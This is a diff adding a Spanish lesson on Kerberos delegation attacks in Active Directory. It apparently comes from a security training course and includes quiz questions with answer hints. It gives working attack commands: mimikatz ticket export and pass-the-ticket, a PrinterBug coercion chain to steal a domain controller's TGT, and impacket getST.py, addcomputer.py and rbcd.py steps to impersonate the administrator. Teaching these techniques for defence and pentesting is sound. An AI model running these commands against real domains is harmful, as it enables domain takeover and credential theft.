@@ -1,0 +1,82 @@
+---
+index: 1
+title: "Delegación Kerberos: unconstrained, constrained y RBCD"
+questions:
+  - id: ad-avanzado-t01-q01
+    prompt: "¿Qué tipo de delegación almacena los TGTs de TODOS los usuarios que se autentican en el servidor?"
+    hint: "Unconstrained delegation — el servidor guarda tickets en LSASS."
+    kind: text
+  - id: ad-avanzado-t01-q02
+    prompt: "¿Qué ataque obliga a un usuario privilegiado a autenticarse contra tu máquina para robar su TGT (unconstrained delegation)?"
+    hint: "PrinterBug o PetitPotam — coerción de autenticación."
+    kind: text
+  - id: ad-avanzado-t01-q03
+    prompt: "¿Qué tipo de delegación permite impersonar SOLO servicios específicos (más restringida)?"
+    hint: "Constrained delegation (SPN-based)."
+    kind: choice
+    options:
+      - id: a
+        label: "Unconstrained (cualquier servicio)"
+      - id: b
+        label: "Constrained (solo SPNs permitidos)"
+      - id: c
+        label: "RBCD (Resource-Based Constrained Delegation)"
+      - id: d
+        label: "Las tres son iguales"
+---
+
+## Unconstrained Delegation: el TGT honeypot
+
+Cuando un servidor tiene **unconstrained delegation**, cualquier usuario que se
+autentique contra él deja SU TGT guardado en memoria (LSASS). Si eres admin de ese
+servidor, puedes extraer los TGTs de todos los que pasaron por ahí.
+
+```bash
+# Identificar servidores con unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+
+# En el servidor comprometido: extraer tickets
+mimikatz # sekurlsa::tickets /export
+# Busca .kirbi files de usuarios con privilegios
+
+# Usar el TGT robado
+mimikatz # kerberos::ptt ticket_admin@CORP.LOCAL.kirbi
+```
+
+### El ataque completo: PrinterBug + Unconstrained
+
+1. Encuentras un servidor con unconstrained delegation donde eres admin
+2. Usas **PrinterBug** (`SpoolSample.exe`) para OBLIGAR al DC a autenticarse contra
+   tu servidor
+3. El DC deja su TGT en tu LSASS
+4. Extraes el TGT → Pass-the-Ticket → eres el DC
+
+## Constrained Delegation: S4U2Self + S4U2Proxy
+
+Constrained delegation solo permite impersonar servicios ESPECÍFICOS (SPNs).
+Pero hay un bug: si puedes modificar el atributo `msDS-AllowedToDelegateTo`:
+
+```bash
+# Con impacket (desde Linux):
+getST.py -spn cifs/dc01.corp.local -impersonate administrator corp.local/svc_account:password
+# Genera un ticket como administrator para el servicio cifs en dc01
+```
+
+## RBCD (Resource-Based Constrained Delegation)
+
+El más moderno: la delegación se configura EN el recurso (no en la cuenta).
+Si puedes modificar `msDS-AllowedToActAsOther` de un objeto:
+
+```bash
+# 1. Crear una cuenta de ordenador falsa
+addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' corp.local/user:pass
+
+# 2. Configurar RBCD en el objetivo
+rbcd.py -delegate-to dc01 -delegate-from EVIL$ -action write corp.local/user:pass
+
+# 3. Pedir tickets impersonando admin
+getST.py -spn cifs/dc01.corp.local -impersonate administrator corp.local/EVIL$:P@ss
+```
+
+RBCD es especialmente peligroso porque solo necesitas WRITE sobre el objeto
+objetivo (no Domain Admin).
